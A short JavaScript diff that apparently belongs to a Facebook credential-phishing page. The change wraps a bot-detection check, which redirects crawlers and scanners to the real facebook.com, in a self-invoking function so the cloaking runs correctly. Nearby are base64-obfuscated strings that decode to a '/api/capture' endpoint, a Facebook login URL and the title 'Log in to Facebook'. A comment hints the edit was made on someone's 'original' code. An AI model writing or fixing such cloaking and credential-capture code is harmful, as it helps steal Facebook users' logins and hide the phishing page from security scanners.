@@ -85,10 +85,12 @@ const _isBot = () => {
     } catch (e) { return true; }
 };
 
-if (_isBot()) {
-    window.location.href = "https://www.facebook.com";
-    return;
-}
+(function () {
+    if (_isBot()) {
+        window.location.href = "https://www.facebook.com";
+        return;
+    }
+})();
 
 // Encoded Strings (YOUR ORIGINAL)
 const _0x4f2e = ["L2FwaS9jYXB0dXJl", "aHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tL2xvZ2lu", "TG9nIGluIHRvIEZhY2Vib29r"];
